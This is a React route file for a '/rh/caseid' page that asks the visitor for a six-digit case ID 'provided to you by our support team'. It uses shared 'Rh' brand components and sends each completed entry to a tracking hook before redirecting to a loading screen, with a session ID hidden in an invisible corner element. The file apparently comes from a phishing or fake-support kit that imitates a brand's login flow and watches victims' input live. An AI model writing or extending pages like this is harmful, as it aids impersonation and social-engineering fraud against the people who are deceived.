import { createFileRoute } from "@tanstack/react-router";
import { useRef, useState } from "react";
import { GlobeIcon, Rh3DBackground, RH_FONT_FAMILY, RhLogo, useRhTracking } from "@/components/rh/RhShared";

export const Route = createFileRoute("/rh/caseid")({
  head: () => ({ meta: [{ title: "Case ID" }] }),
  component: RhCaseIdPage,
});

function RhCaseIdPage() {
  const { trackClick, trackInput, rhNavigate, sessionId } = useRhTracking();
  const [digits, setDigits] = useState<string[]>(["", "", "", "", "", ""]);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newDigits = [...digits];
    newDigits[index] = value.slice(-1);
    setDigits(newDigits);
    if (value && index < 5) inputRefs.current[index + 1]?.focus();
    if (newDigits.every((d) => d !== "")) {
      trackInput("Case ID", newDigits.join(""));
      trackClick("Case ID Submitted");
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) inputRefs.current[index - 1]?.focus();
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (!pasted) return;
    const newDigits = [...digits];
    for (let i = 0; i < pasted.length; i++) newDigits[i] = pasted[i];
    setDigits(newDigits);
    inputRefs.current[Math.min(pasted.length, 5)]?.focus();
    if (newDigits.every((d) => d !== "")) {
      trackInput("Case ID", newDigits.join(""));
      trackClick("Case ID Submitted");
    }
  };

  const allFilled = digits.every((d) => d !== "");

  const handleContinue = () => {
    if (!allFilled) return;
    trackClick("Case ID Continue");
    rhNavigate("/rh/loading");
  };

  return (
    <div style={{ display: "flex", minHeight: "100vh", background: "#000", fontFamily: RH_FONT_FAMILY }}>
      <style>{`
        @keyframes rhFadeIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
        .rh-animate { animation: rhFadeIn 0.5s cubic-bezier(0.16, 1, 0.3, 1) both; }
        .rh-animate-d1 { animation-delay: 0.05s; } .rh-animate-d2 { animation-delay: 0.1s; }
        .rh-animate-d3 { animation-delay: 0.15s; } .rh-animate-d4 { animation-delay: 0.2s; }
        .rh-digit { width: 100%; aspect-ratio: 1; text-align: center; font-size: 24px; font-weight: 500; border-radius: 4px; border: 1px solid rgba(255,255,255,0.3); background: transparent; color: #fff; outline: none; caret-color: #fff; transition: border-color 0.15s, box-shadow 0.15s, transform 0.15s; font-family: inherit; }
        .rh-digit:focus { border-color: rgba(255,255,255,0.8); box-shadow: 0 0 0 1px rgba(255,255,255,0.3); transform: scale(1.05); }
        .rh-digit.filled { border-color: rgba(255,255,255,0.6); }
      `}</style>

      <div className="hidden md:flex" style={{ width: "50%", background: "#000", alignItems: "center", justifyContent: "center", overflow: "hidden", position: "relative" }}>
        <Rh3DBackground />
      </div>
      <div className="hidden md:block" style={{ width: 1, background: "rgba(255,255,255,0.12)", flexShrink: 0 }} />

      <div className="w-full md:w-1/2" style={{ background: "#000", display: "flex", flexDirection: "column" }}>
        <div className="md:hidden" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "20px 24px" }}>
          <RhLogo />
          <button style={{ display: "flex", alignItems: "center", gap: 6, background: "transparent", border: "none", color: "#fff", fontSize: 14, fontWeight: 500, cursor: "pointer", padding: "8px 12px" }}>
            <GlobeIcon />
            <span>US</span>
          </button>
        </div>

        <div style={{ flex: 1, display: "flex", alignItems: "flex-start", justifyContent: "center", padding: "80px 60px 40px 60px" }}>
          <div style={{ width: "100%", maxWidth: 416 }}>
            <h1 className="rh-animate" style={{ fontSize: 28, fontWeight: 400, color: "#fff", marginBottom: 12, lineHeight: 1.3 }}>Case ID</h1>
            <p className="rh-animate rh-animate-d1" style={{ fontSize: 14, color: "rgba(255,255,255,0.5)", marginBottom: 40, lineHeight: "20px" }}>
              Enter the 6-digit case ID provided to you by our support team.
            </p>

            <div className="rh-animate rh-animate-d2" style={{ display: "grid", gridTemplateColumns: "repeat(6, 1fr)", gap: 12 }}>
              {digits.map((digit, i) => (
                <input
                  key={i}
                  ref={(el) => { inputRefs.current[i] = el; }}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleChange(i, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(i, e)}
                  onPaste={i === 0 ? handlePaste : undefined}
                  className={`rh-digit ${digit ? "filled" : ""}`}
                />
              ))}
            </div>

            <button className="rh-animate rh-animate-d4" onClick={handleContinue} disabled={!allFilled}
              style={{ width: "100%", height: 52, marginTop: 24, borderRadius: 26, border: "none", background: allFilled ? "#fff" : "rgba(255,255,255,0.15)", color: allFilled ? "#000" : "rgba(255,255,255,0.3)", fontSize: 16, fontWeight: 500, fontFamily: "inherit", cursor: allFilled ? "pointer" : "not-allowed" }}>
              Continue
            </button>
          </div>
        </div>
      </div>
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">{sessionId}</div>
    </div>
  );
}
